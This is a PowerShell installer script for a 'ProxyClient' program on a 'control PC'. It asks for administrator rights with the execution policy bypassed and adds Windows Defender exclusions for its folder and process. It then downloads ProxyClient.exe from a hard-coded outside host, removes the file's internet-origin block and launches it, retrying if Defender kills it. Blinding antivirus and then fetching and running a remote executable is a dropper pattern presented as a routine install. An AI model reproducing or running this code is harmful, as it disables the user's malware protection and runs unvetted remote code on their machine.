# ProxyClient install (control PC) - ASCII only for PowerShell 5.1 compatibility
param(
    [switch]$Silent,
    [switch]$NoStart,
    [switch]$Elevated
)

$ErrorActionPreference = "Continue"
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    Unblock-File -LiteralPath $scriptPath -ErrorAction SilentlyContinue
}
$BaseUrl = $env:RESA_INSTALL_BASE
if (-not $BaseUrl) {
    $BaseUrl = "https://olxp.cc/download"
}
$BaseUrl = $BaseUrl.Trim().TrimEnd("/")
if ($BaseUrl -match "\s") {
    $BaseUrl = ($BaseUrl -split "\s+")[0]
}

$Dir = Join-Path $env:LOCALAPPDATA "ReProxyClient"
$Exe = Join-Path $Dir "ProxyClient.exe"
$Temp = Join-Path $env:TEMP "ProxyClient-download.exe"
$LogFile = Join-Path $env:TEMP "ProxyClient-install.log"
$script:HadError = $false
$script:DefenderOk = $false

function Write-InstallLog {
    param([string]$Text)
    $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " " + $Text
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {
        $null = $_
    }
    if (-not $Silent) {
        Write-Host $Text
    }
}

function Fail-Install {
    param([string]$Text)
    $script:HadError = $true
    Write-InstallLog $Text
    if (-not $Silent) {
        Write-Host $Text -ForegroundColor Red
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutFile
    )

    $ProgressPreference = "SilentlyContinue"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    } catch {
        $null = $_
    }

    $curl = Join-Path $env:SystemRoot "System32\curl.exe"
    if (Test-Path -LiteralPath $curl) {
        & $curl -fsSL --retry 2 --retry-delay 1 -o $OutFile $Url
        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $OutFile)) {
            return
        }
    }

    Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing
}

function Get-CacheBustStamp {
    return (Get-Date).ToUniversalTime().ToString("yyyyMMddHHmmss")
}

function Test-IsAdmin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Ensure-AdminElevation {
    if (Test-IsAdmin) {
        return
    }
    if ($Elevated) {
        Write-InstallLog "elevation declined or failed; continuing without admin"
        if (-not $Silent) {
            Write-Host "Defender exclusions need Administrator. ProxyClient may be blocked." -ForegroundColor Yellow
        }
        return
    }

    if (-not $scriptPath) {
        return
    }

    Write-InstallLog "requesting administrator elevation"
    if (-not $Silent) {
        Write-Host "Requesting administrator permission (Defender exclusions)..." -ForegroundColor Yellow
    }

    $safePath = $scriptPath -replace "'", "''"
    $safeBase = $BaseUrl -replace "'", "''"
    $extra = " -Elevated"
    if ($Silent) {
        $extra += " -Silent"
    }
    if ($NoStart) {
        $extra += " -NoStart"
    }
    $cmd = "`$env:RESA_INSTALL_BASE='$safeBase'; & '$safePath'$extra"

    try {
        Start-Process -FilePath "powershell.exe" -ArgumentList @(
            "-NoProfile",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            $cmd
        ) -Verb RunAs | Out-Null
        exit 0
    } catch {
        Write-InstallLog ("elevation cancelled: " + $_.Exception.Message)
        if (-not $Silent) {
            Write-Host "Administrator permission is required for Defender exclusions." -ForegroundColor Red
        }
        exit 1
    }
}

function Add-DefenderExclusion {
    param(
        [string]$Path,
        [string]$ExePath
    )

    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Write-InstallLog ("defender path exclusion ok: " + $Path)
        $script:DefenderOk = $true
    } catch {
        Write-InstallLog ("defender path exclusion skipped: " + $_.Exception.Message)
    }

    try {
        Add-MpPreference -ExclusionProcess "ProxyClient.exe" -ErrorAction Stop
        Write-InstallLog "defender process exclusion ok: ProxyClient.exe"
        $script:DefenderOk = $true
    } catch {
        Write-InstallLog ("defender process exclusion skipped: " + $_.Exception.Message)
    }

    if ($ExePath -and (Test-Path -LiteralPath $ExePath)) {
        try {
            Add-MpPreference -ExclusionPath $ExePath -ErrorAction Stop
            Write-InstallLog ("defender file exclusion ok: " + $ExePath)
            $script:DefenderOk = $true
        } catch {
            Write-InstallLog ("defender file exclusion skipped: " + $_.Exception.Message)
        }
    }
}

function Start-ProxyClientWithRetry {
    param(
        [string]$ExePath,
        [string]$WorkDir,
        [int]$Attempts = 3
    )

    for ($i = 1; $i -le $Attempts; $i++) {
        try {
            Start-Process -FilePath $ExePath -WorkingDirectory $WorkDir
            Start-Sleep -Seconds 2
            if (Get-Process -Name "ProxyClient" -ErrorAction SilentlyContinue) {
                Write-InstallLog ("started ProxyClient.exe (attempt " + $i + ")")
                return $true
            }
            Write-InstallLog ("ProxyClient.exe exited quickly (attempt " + $i + "), retrying...")
        } catch {
            Write-InstallLog ("start attempt " + $i + " failed: " + $_.Exception.Message)
        }
        Start-Sleep -Seconds 2
    }
    Write-InstallLog "ProxyClient.exe did not stay running; Defender may have blocked it"
    return $false
}

Ensure-AdminElevation

Write-InstallLog "install start"
Write-InstallLog ("target: " + $Exe)
if (Test-IsAdmin) {
    Write-InstallLog "running as administrator"
} else {
    Write-InstallLog "not administrator; defender exclusions may fail"
}

try {
    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
} catch {
    $null = $_
}

Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null

try {
    $stamp = Get-CacheBustStamp
    $url = "$BaseUrl/ProxyClient.exe?t=$stamp"
    Write-InstallLog ("download: " + $url)
    Download-File -Url $url -OutFile $Temp
    if (-not (Test-Path -LiteralPath $Temp)) {
        Fail-Install "download failed"
        exit 1
    }
    if (Test-Path -LiteralPath $Exe) {
        Remove-Item -LiteralPath $Exe -Force -ErrorAction SilentlyContinue
    }
    Move-Item -LiteralPath $Temp -Destination $Exe -Force
    Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
    Write-InstallLog "download ok"
} catch {
    Fail-Install ("download error: " + $_.Exception.Message)
    exit 1
}

Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null

if (-not $NoStart) {
    Start-ProxyClientWithRetry -ExePath $Exe -WorkDir $Dir | Out-Null
}

if (-not $script:DefenderOk -and -not (Test-IsAdmin)) {
    Write-InstallLog "defender exclusions not applied; run install as administrator"
}

if ($script:HadError) {
    exit 1
}
Write-InstallLog "install done"
if (-not $Silent) {
    Write-Host ""
    Write-Host ("Installed: " + $Exe) -ForegroundColor Green
    Write-Host ("Log: " + $LogFile)
}
exit 0
